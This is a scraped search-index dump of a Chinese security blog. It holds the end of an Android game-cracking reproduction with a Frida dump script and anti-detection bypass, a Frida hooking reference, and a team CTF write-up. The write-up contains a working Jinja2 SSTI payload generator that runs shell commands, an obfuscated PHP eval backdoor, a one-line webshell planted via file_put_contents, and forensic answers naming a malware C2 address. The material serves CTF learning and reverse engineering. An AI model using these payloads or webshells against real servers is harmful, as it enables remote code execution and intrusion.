\u0026#39;/data/data/com.tencent.mf.uam/files/\u0026#39; # 路径 let prefix = \u0026#39;/data/data/com.personal.rocketmouse/files/\u0026#39;; let mkdir = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;mkdir\u0026#39;); let chmod = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;chmod\u0026#39;); let fopen = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fopen\u0026#39;); let fwrite = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fwrite\u0026#39;); let fclose = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fclose\u0026#39;); let call_mkdir = new NativeFunction(mkdir, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;]); let call_chmod = new NativeFunction(chmod, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;]); let call_fopen = new NativeFunction(fopen, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); let call_fwrite = new NativeFunction(fwrite, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;pointer\u0026#39;]); let call_fclose = new NativeFunction(fclose, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;]); call_mkdir(Memory.allocUtf8String(prefix), 0x1FF); call_chmod(Memory.allocUtf8String(prefix), 0x1FF); let fp = call_fopen( Memory.allocUtf8String(prefix + file_path), Memory.allocUtf8String(\u0026#39;wb\u0026#39;)); if (call_fwrite(addr, 1, size, fp)) { console.log(\u0026#39;[+] Write file success, file path: \u0026#39; + prefix + file_path); } else { console.log(\u0026#39;[x] Write file failed\u0026#39;); } call_fclose(fp); }); } dump完成之后分析dll文件，因为目标为实现无敌，所以只需要修改游戏逻辑中对碰撞的检测即可，定位到MouseController类的OnTriggerEnter2D函数\n如果不是金币就会调用HitByLaser函数，所以只要把相应的Dead属性改为false即可，在ida中静态patch，原来为4.1，改为4.0即可\n最后只需要把0x1CF88处的跳转指令改成B ，使非MZ开头的dll才执行解密函数，并把原本的dll替换成破解版即可\n复现中遇到的问题 打开APP就会退出并弹窗\u0026quot;hacker detect:xxx\u0026quot;，后面发现是app检测了tmp目录下是否存在frida/ida相关的东西，更改名称即可过检测\n使用frida启动APP仍然会退出，是对frida的一些行为进行检测。使用florida过了检测\n尝试hook libsec2021.so中的sub_1F120(字符串解密函数)时,会出现opcode crack的情况,原因未查明，但是通过patch掉退出函数的调用也能过，缺点是只能hook出部分字符串\n在dump内存的时候，会出现dump不出来的情况，后面检查发现是libmono.so是动态加载的，于是要先hook dlopen函数，在libmono.so加载之后再进行hook，并执行内存dump\ndump Assembly-CSharp.dll的时候，是根据dll的大小来判断的，目前不清楚具体原因是什么，但是在hook mono_image_open_from_data_with_name函数的时候发现他加载的文件大小差异比较大，目前猜测是比较所有被加载的dll的大小之后才判断要dump大小为0x2800的dll文件\n","date":"2024-12-23T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011927719.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/gamesafety2021-android%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/","title":"GameSafety2021 Android方向初赛题目复现"},{"content":"Frida相关api Java层 静态方法和实例方法的Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 var money = Java.use(\u0026#34;com.Jeremiah.hook.money\u0026#34;); //不需要区分修饰符，也不需要区分静态和实例方法，hook代码的写法都是一样的 //hook实例方法 money.getInfo.implementation = function () { var result = this.getInfo(); console.log(\u0026#34;result: \u0026#34;, result) return result; } //hook静态方法 money.setFlag.implementation = function (a) { console.log(\u0026#34;param: \u0026#34;, a); return this.setFlag(a); } 函数参数和返回值的修改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var money = Java.use(\u0026#34;com.Jeremiah.hook.Money\u0026#34;); var str = Java.use(\u0026#34;java.lang.String\u0026#34;); money.getInfo.implementation = function () { var result = this.getInfo(); console.log(\u0026#34;money.getInfo result: \u0026#34;, result); return str.$new(\u0026#34;Jeremiah\u0026#34;); //上述字符串\u0026#34;Jeremiah\u0026#34;是JS的string，而被hook的Java方法返回值是Java的String //因此，可以主动调用Java方法转成Java的String //但是为了方便起见，通常会直接直接返回JS的string，这时frida会自动处理，代码类似如下 //return \u0026#34;Jeremiah\u0026#34;; //Java的类型可以调用Java的方法，JS的类型可以调用JS的方法 //区分清楚何时是Java的类型，何时是JS的类型，有助于代码的编写 //frida在参数传递的处理上也类似 } money.setFlag.implementation = function (a) { console.log(\u0026#34;money.setFlag param: \u0026#34;, a); return this.setFlag(\u0026#34;Jeremiah\u0026#34;); } 构造方法的Hook $init 1 2 3 4 5 var money = Java.use(\u0026#34;com.Jeremiah.hook.Money\u0026#34;); money.$init.implementation = function(a,b){ console.log(\u0026#34;money.$init param: \u0026#34;,a, b); return this.$init(\u0026#34;dollar\u0026#34;,200); } String类的构造函数要Hook ==StringFactory==类下的某一些方法\n对象参数的构造与修改 $new 1 2 3 4 5 6 7 8 9 10 11 12 13 var wallet = Java.use(\u0026#34;com.Jeremiah.hook.Wallet\u0026#34;); var money = Java.use(\u0026#34;com.Jeremiah.hook.Money\u0026#34;); wallet.deposit.implementation = function (a) { console.log(\u0026#34;wallet.deposit param: \u0026#34;, a.getInfo()); return this.deposit(money.$new(\u0026#34;dollar\u0026#34;, 200)); } var wallet = Java.use(\u0026#34;com.Jeremiah.hook.Wallet\u0026#34;); wallet.deposit.implementation = function (a) { a.setAmount(2000); console.log(\u0026#34;wallet.deposit param: \u0026#34;, a.getInfo()); return this.deposit(a); } HashMap的打印 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var utils = Java.use(\u0026#34;com.Jeremiah.hook.Utils\u0026#34;); var stringBuilder = Java.use(\u0026#34;java.lang.StringBuilder\u0026#34;); utils.shufferMap.implementation = function (a) { var key = a.keySet(); //得到所有的key var it = key.iterator(); var result = stringBuilder.$new(); while(it.hasNext()){ var keystr = it.next(); var valuestr = a.get(keystr); result.append(valuestr); } console.log(\u0026#34;utils.shufferMap param: \u0026#34;, result.toString()); var result = this.shufferMap(a); console.log(\u0026#34;utils.shufferMap result: \u0026#34;, result); return result; } 重载方法的Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 var utils = Java.use(\u0026#34;com.Jeremiah.hook.Utils\u0026#34;); utils.getCalc.overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b) { console.log(\u0026#34;utils.getCalc param: \u0026#34;, a, b); return this.getCalc(a, b); } utils.getCalc.overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c) { console.log(\u0026#34;utils.getCalc param: \u0026#34;, a, b, c); return this.getCalc(a, b, c); } utils.getCalc.overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c, d) { console.log(\u0026#34;utils.getCalc param: \u0026#34;, a, b, c, d); return this.getCalc(a, b, c, d); } Hook方法的所有重载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var utils = Java.use(\u0026#34;com.Jeremiah.hook.Utils\u0026#34;); var overloadsArr = utils.getCalc.overloads; //包含该方法的所有重载函数，overloads返回重载函数的数组 for (var i = 0; i \u0026lt; overloadsArr.length; i++) { overloadsArr[i].implementation = function () { showStacks(); var params = \u0026#34;\u0026#34;; for (var j = 0; j \u0026lt; arguments.length; j++) { //arguments存储所有传进函数的参数 params += arguments[j] + \u0026#34; \u0026#34;; } console.log(\u0026#34;utils.getCalc is called! params is: \u0026#34;, params); // if(arguments.length == 2){ // return this.getCalc(arguments[0], arguments[1]); // }else if(arguments.length == 3){ // return this.getCalc(arguments[0], arguments[1], arguments[2]); // }else if(arguments.length == 4){ // return this.getCalc(arguments[0], arguments[1], arguments[2], arguments[3]); // } console.log(this); return this.getCalc.apply(this, arguments); //第一个参数为当前的Java对象实例，第二个参数为一个数组或类数组对象，这里包含了传进函数的参数，此处apply用于调用原来的getCalc方法 } } ","date":"2024-12-16T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501012305417.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/frida%E5%B8%B8%E7%94%A8api%E8%AE%B0%E5%BD%95/","title":"Frida常用API记录"},{"content":"Write UP最好的一叉树使用者 WEB Safe_Proxy By Ron SSTI题，脚本一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 # 条件：可设置 session # 用到的字符 {{}} [] () | select string lipsum session def payload1(): g = \u0026#34;(()|select|string)[1]\u0026#34; e = \u0026#34;(()|select|string)[2]\u0026#34; n = \u0026#34;(()|select|string)[3]\u0026#34; r = \u0026#34;(()|select|string)[5]\u0026#34; a = \u0026#34;(()|select|string)[6]\u0026#34; t = \u0026#34;(()|select|string)[7]\u0026#34; o = \u0026#34;(()|select|string)[8]\u0026#34; _global_ = \u0026#34;session[%s]\u0026#34;%g _builtins_ = \u0026#34;session[%s]\u0026#34; % e _import_ = \u0026#34;session[%s]\u0026#34; % n os = \u0026#34;session[%s]\u0026#34; % r popen = \u0026#34;session[%s]\u0026#34; % a cmd = \u0026#34;session[%s]\u0026#34;%t read = \u0026#34;session[%s]\u0026#34; % o session[\u0026#39;g\u0026#39;] = \u0026#34;__globals__\u0026#34; session[\u0026#39;e\u0026#39;] = \u0026#34;__builtins__\u0026#34; session[\u0026#39;n\u0026#39;] = \u0026#34;__import__\u0026#34; session[\u0026#39;r\u0026#39;] = \u0026#34;os\u0026#34; session[\u0026#39;a\u0026#39;] = \u0026#34;popen\u0026#34; session[\u0026#39;t\u0026#39;] = \u0026#34;whoami\u0026#34; session[\u0026#39;o\u0026#39;] = \u0026#34;read\u0026#34; # lipsum 和 url_for 可互换 s = \u0026#34;{{(lipsum[%s][%s][%s](%s)[%s](%s)|attr(%s))()}}\u0026#34;%(_global_,_builtins_,_import_,os,popen,cmd,read) print(s) def generate_number(num:int): num_map = { 0:\u0026#39;([]|length)\u0026#39;, 1:\u0026#39;([g]|length)\u0026#39;, 5:\u0026#39;(()|select|string|wordcount)\u0026#39;, 6:\u0026#39;(()|select|string|urlencode|wordcount)\u0026#39;, 12:\u0026#39;([g,g,g]|wordcount)\u0026#39;, 16:\u0026#39;([g,g,g,g]|wordcount)\u0026#39;, 20:\u0026#39;([g,g,g,g,g]|wordcount)\u0026#39;, 24:\u0026#39;([g,g,g,g,g,g]|wordcount)\u0026#39;, 28:\u0026#39;([g,g,g,g,g,g,g]|wordcount)\u0026#39;, 32:\u0026#39;([g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 36:\u0026#39;([g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 40:\u0026#39;([g,g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 44:\u0026#39;([g,g,g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 48:\u0026#39;([g,g,g,g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 106:\u0026#39;([config,config]|wordcount)\u0026#39;, } keys = sorted(num_map.keys(),reverse=True) r = [] for i in keys: while num \u0026gt;= i: num -= i r.append(num_map[i]) final_number = f\u0026#34;(([{\u0026#39;,\u0026#39;.join(r)}])|sum)\u0026#34; return final_number def use_c(target): # format_c = \u0026#39;(()|select|string|urlencode)[0]~(()|select|string)[15]\u0026#39; # %c # format_c = \u0026#39;(()|select|string|urlencode)|attr(\\\u0026#39;__getitem__\\\u0026#39;)(0)~(()|select|string)|attr(\\\u0026#39;__getitem__\\\u0026#39;)(15)\u0026#39; # 在每个payload开头加上: {% set c = (()|select|string|urlencode)[0]~(()|select|string)[15] %} # 则format_c 可以这样写: format_c = \u0026#39;c\u0026#39; format_c = \u0026#39;((()|select|string|urlencode)[0]~(()|select|string)[15])\u0026#39; format_s = (\u0026#39;%s~\u0026#39;*len(target))[:-1] # %s~%s~%s~%s~ .... if False: # 不使用波浪线 # 用join 替代波浪线 format_c = \u0026#39;[(()|select|string|urlencode)[0],(()|select|string)[15]]|join\u0026#39; format_s = \u0026#39;[\u0026#39;+(\u0026#39;,\u0026#39;.join([\u0026#39;%s\u0026#39; for i in range(len(target))])) + \u0026#39;]|join\u0026#39; if True: # 不使用数字 format_c = f\u0026#39;[(()|select|string|urlencode)[{generate_number(0)}],(()|select|string)[{generate_number(15)}]]|join\u0026#39; format_s = \u0026#39;[\u0026#39;+(\u0026#39;,\u0026#39;.join([\u0026#39;%s\u0026#39; for i in range(len(target))])) + \u0026#39;]|join\u0026#39; format_tuple = (format_c,)*len(target) _class_ascii = \u0026#39;,\u0026#39;.join([str(ord(c)) for c in target]) # _class_ascii = \u0026#39;,\u0026#39;.join([generate_number(ord(c)) for c in target]) format_tuple+= (_class_ascii,) # |format() 和 % 可以平替 result = f\u0026#39;(({format_s})|format(%s))\u0026#39; # result = f\u0026#39;(({format_s})%%(%s))\u0026#39; result = result%format_tuple return result def str2chr(string): r = \u0026#39;\u0026#39; for c in string: r += f\u0026#39;chr({ord(c)})+\u0026#39; return r[:-1] def str2ascii(string): r = \u0026#39;\u0026#39; for c in string: r += f\u0026#39;{ord(c)},\u0026#39; return r[:-1] def payload2(cmd): # v1 不使用引号 # 使用字符：{{ [] () ~ | attr select string urlencode format lipsum # payload = \u0026#39;{{((lipsum[%s][%s][%s](%s))|attr(%s)(%s))|attr(%s)()}}\u0026#39; % (use_c(\u0026#39;__globals__\u0026#39;),use_c(\u0026#39;__builtins__\u0026#39;),use_c(\u0026#39;__import__\u0026#39;),use_c(\u0026#39;os\u0026#39;),use_c(\u0026#39;popen\u0026#39;),use_c(\u0026#39;whoami\u0026#39;),use_c(\u0026#39;read\u0026#39;)) # v2 不使用 [] # 使用字符：{{ \u0026#39; () ~ | attr select string urlencode format lipsum # 使用时候把 use_c 的 format_c 改一下 # lipsum,url_for,get_flashed_messages 可互换 payload = \u0026#39;{{get_flashed_messages|attr(%s)|attr(%s)(%s)|attr(%s)(%s)(%s)|attr(%s)(%s)|attr(%s)()}}\u0026#39;%(use_c(\u0026#39;__globals__\u0026#39;),use_c(\u0026#39;get\u0026#39;),use_c(\u0026#39;__builtins__\u0026#39;),use_c(\u0026#39;get\u0026#39;),use_c(\u0026#39;__import__\u0026#39;),use_c(\u0026#39;os\u0026#39;),use_c(\u0026#39;popen\u0026#39;),use_c(cmd),use_c(\u0026#39;read\u0026#39;)) return payload import requests url = \u0026#39;http://39.105.45.179:30722/\u0026#39; requests.post(url=url,data={\u0026#39;code\u0026#39;:payload2(\u0026#39;mkdir /app/static\u0026#39;)}) requests.post(url=url,data={\u0026#39;code\u0026#39;:payload2(\u0026#39;cat /flag \u0026gt; /app/static/flag.html\u0026#39;)}) WEB hello_web By Ron 连接容器，发现自动跳转到index.php?file=hello.php\n?file字样猜测是文件包含\n看主页源代码发现../tips.php和../hackme.php，?file过滤了data,http,php://\n主页回报的头中发现tip: \u0026amp;#105;\u0026amp;#110;\u0026amp;#99;\u0026amp;#108;\u0026amp;#117;\u0026amp;#100;\u0026amp;#101;\u0026amp;#46;\u0026amp;#112;\u0026amp;#104;\u0026amp;#112，解码发现是include.php\n尝试file:///var/log/nginx/access.log包含日志，打不通\n../和/后跟tips.php和hackme.php都说不是这里，猜测过滤了../，被消除了，所以进行双写绕过(....//)\n....//tips.php下是phpinfo，....//hackme.php下是\n1 2 3 4 5 6 \u0026lt;?php highlight_file(__FILE__); $lJbGIY=\u0026#34;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME\u0026#34;;$OlWYMv=\u0026#34;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel\u0026#34;;$lapUCm=urldecode(\u0026#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\u0026#34;); $YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30}; eval($YwzIst(\u0026#34;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==\u0026#34;)); ?\u0026gt; 1 2 3 4 5 6 \u0026lt;?php highlight_file(__FILE__); $lJbGIY=\u0026#34;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME\u0026#34;;$OlWYMv=\u0026#34;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel\u0026#34;;$lapUCm=urldecode(\u0026#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\u0026#34;); $YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30}; eval($YwzIst(\u0026#34;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==\u0026#34;)); ?\u0026gt; \u0026lt;?php @eval($_POST['cmd_66.99']); ?\u0026gt;\n参数名应该是cmd[66.99，php中第一个[会被当作非法字符替换成_。\n写个shell，cmd[66.99=file_put_contents('shell.php','\u0026lt;?php @eval($_POST[1]);?\u0026gt;');，再使用蚁剑连接\n发现无法执行命令，使用蚁剑插件绕过禁用的函数\n参考文献：https://blog.csdn.net/qq_62987084/article/details/142058918\n修改蚁剑连接\n执行成功\nfind / -name \u0026quot;*flag*\u0026quot; 2\u0026gt; /dev/null\n成功cat flag\nCrypto rasnd By Ron 使用脚本连接靶机，爆破得到flag1，flag2需要使用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 from pwn import * from Crypto.Util.number import * import math # Config LOCAL = False remote_addr = \u0026#39;IP_ADDRESS\u0026#39; # CHANGEME remote_port = 65535 # CHANGEME context.log_level=\u0026#39;INFO\u0026#39; # [\u0026#39;CRITICAL\u0026#39;, \u0026#39;DEBUG\u0026#39;, \u0026#39;ERROR\u0026#39;, \u0026#39;INFO\u0026#39;, \u0026#39;NOTSET\u0026#39;, \u0026#39;WARNING\u0026#39;] e = 65537 def get_Process(): if LOCAL: p = process(file) else: p = remote(remote_addr ,remote_port) return p def decrypt1(n: int, c: int, hint1: int, hint2: int): for i in range(2**11): for j in range(2**11): R = GCD(hint1*i - hint2*j,n) if 1 \u0026lt; R and R \u0026lt; n: q = GCD(hint1*i - hint2*j,n) print(q) p = n//q d = inverse(e,(p-1)*(q-1)) m = pow(c,d,n) return(long_to_bytes(m).decode()) def decrypt2(n: int, c: int, hint: int): b = pow(hint, -1, n) c_quadratic = -514 * n delta = b * b - 4 * 114 * c_quadratic sqrt_delta = int(math.isqrt(delta)) q = (-b + sqrt_delta) // (2 * 114) if n % q != 0: q = (-b - sqrt_delta) // (2 * 114) p = n // q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) m = pow(c, d, n) return long_to_bytes(m).decode() def exp(): p = get_Process() # Real Start of EXP # 接收========= p.recvuntil(b\u0026#39;\\n\u0026#39;) # Crypto1 c1n = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c1c = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c1hint1 = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) + 0x114 c1hint2 = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) + 0x514 print(f\u0026#39;[*] c1n={c1n}\u0026#39;) print(f\u0026#39;[*] c1c={c1c}\u0026#39;) print(f\u0026#39;[*] c1hint1={c1hint1}\u0026#39;) print(f\u0026#39;[*] c1hint2={c1hint2}\u0026#39;) # 接收========= p.recvuntil(b\u0026#39;\\n\u0026#39;) # Crypto2 c2n = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c2c = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c2hint = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) print(f\u0026#39;[*] c2n={c2n}\u0026#39;) print(f\u0026#39;[*] c2c={c2c}\u0026#39;) print(f\u0026#39;[*] c2hint={c2hint}\u0026#39;) p.close() # 接收数据完成 flag = decrypt1(c1n, c1c, c1hint1, c1hint2) print(\u0026#39;[+] Flag1 Decrypted!\u0026#39;) flag += decrypt2(c2n, c2c, c2hint) print(\u0026#39;[+] Flag2 Decrypted!\u0026#39;) print(flag) if __name__ == \u0026#39;__main__\u0026#39;: exp() Reverse ezCsky By Jeremiah Ghidra打开可以看到函数的导出表有rc4加密和swap和xor的字样\n在010中可以看到有testkey，猜测为rc4的密钥，在0xAA0位置有42字节的密文数据提取出来并进行rc4解密可以得到hex数据0a0d061c1f545653575100031d14585603191c0054034b14580702494c020701510c0800010003004f7d\n猜测xor部分是以第一个字节为准与下一位异或得到明文，最后把字符串反转后得到flag，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; static const char *hex_cipher = \u0026#34;0a0d061c1f545653575100031d14585603191c0054034b14580702494c020701510c0800010003004f7d\u0026#34;; int main(void) { size_t hex_len = strlen(hex_cipher); size_t enc_len = hex_len / 2; unsigned char *encrypted = malloc(enc_len); for (size_t i = 0; i \u0026lt; enc_len; i++) { unsigned int val; sscanf(hex_cipher + 2*i, \u0026#34;%2x\u0026#34;, \u0026amp;val); encrypted[i] = (unsigned char)val; } unsigned char *decrypted = calloc(enc_len + 1, 1); for (size_t i = 0; i \u0026lt; enc_len; i++) { unsigned char c = encrypted[enc_len - 1 - i]; decrypted[i+1] = decrypted[i] ^ c; } for (size_t i = 0; i \u0026lt; (enc_len+1)/2; i++) { unsigned char temp = decrypted[i]; decrypted[i] = decrypted[enc_len - i]; decrypted[enc_len - i] = temp; } ssize_t final_len = enc_len; while (final_len \u0026gt;= 0 \u0026amp;\u0026amp; decrypted[final_len] == 0) { final_len--; } final_len++; decrypted[final_len] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, decrypted); free(encrypted); free(decrypted); return 0; } //flag{d0f5b330-9a74-11ef-9afd-acde48001122} Reverse dump 运行题目给的程序发现任意更改一个字符不会导致后面的输出产生问题\n并且尝试输入flag{发现跟题目给的内容前几位一致\n推测为自定义字符表，所以可以爆破，爆破得到结果为flag{MTczMDc4MzQ2Ng==}\nForensic zeroshell_1 在Packet 11029的http请求的Referer发现疑似Base64编码内容\nZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9\n解码后得到flag为flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}\nForensic zeroshell_2 因为给了虚拟机，直接用Diskgenius挂载磁盘\n发现四个分区，经过寻找后在第四个分区PROFILES/\\_DB.001里面找到flag文件，内容为c6045425-6e6e-41d0-be09-95682a4f65c4，所以flag为flag{c6045425-6e6e-41d0-be09-95682a4f65c4}\nForensic zeroshell_3 在找第二题的时候，同级目录下发现用.nginx文件且大小异常（816.4KB)，纯文本打开发现ELF头\n丢进IDA，在sub_804D9A4函数中发现IP地址202.115.89.103，所以结果为flag{202.115.89.103}\nForensic zeroshell_4 随着上一题，因为.nginx大小异常且带有ELF头，所以答案是flag{.nginx}\nForensic zeroshell_5 在IDA中，按下Shift + F12，在上面IP地址的正下方发现意义不明的字符串11223344qweasdzxc，推测为密码，提交正确\nForensic WinFT_1 打开题目提供的虚拟机，使用桌面提供的Currport.exe，发现可疑程序flvupdate.exe\n进一步查看发现远端域名为miscsecure.com，IP地址为192.168.116.130，端口为443，所以flag为flag{miscsecure.com:192.168.116.130:443}\nForensic WinFT_2 计划任务程序发现可以计划Driverupdates，点入发现描述内有内容\nf^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=\n冒号后面疑似Base64，放入赛博厨子，经过Base64 + HTML Entity可以得到结果为Nice，flag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}，所以flag为flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}\nForensic Sc05_1 从给的Excel表格中搜索IP 134.6.4.12，发现TCP连接比HTTP早，所以采用TCP连接的时间2024/11/09 16:22:42\n根据题目要求，改为2024/11/09_16:22:42，进行MD5计算并转换为大写，最后答案为flag{01DF5BC2388E287D4CC8F11EA4D31929}\nForensic Kiwi 在第33414个包发现疑似经过Base64编码的内容\nl1Mvs8wZ1LI/v3Vup1zF8bzdp1B51zz0e0xdfIXNBQMOe1wFEg+Z03ljczfC1qGdp0Y6bWnJ7rUqnQrZmVT9nFPRXqYpURBxuBKInjI5Q2xVgs56q4VRCQWbiyv00Aw7D0CKEotHSy6sQAC1x3T9wDx6xPCioqx/0nwNgrvJnF1Oq7NFZsVpnAxaZC5BVfKSEttFPjYgv3uSfmtxeJg7pPCHmJ8qf/Sd7W7n3gKSB2BELb==\n将题目提供的程序丢进IDA，发现函数sub_140082974内有加密逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 